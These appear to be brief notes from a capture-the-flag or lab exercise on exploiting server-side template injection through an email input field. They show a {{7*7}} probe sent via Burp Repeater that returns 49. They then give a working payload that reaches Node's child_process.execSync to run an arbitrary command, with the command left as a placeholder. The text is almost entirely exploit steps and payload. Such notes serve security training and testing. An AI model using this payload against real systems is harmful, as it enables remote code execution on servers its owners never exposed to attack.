We play around with the email input here

We try SSTI by inputting `{{7*7}}` for email

Note: need to do this through repeater in burp

Response:
```
{"response":"You will receive updates on the following email address: 49."}
```

This confirms we can use SSTI

---

SSTI Payload:

```
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('<RCE COMMAND>')\")()}}
```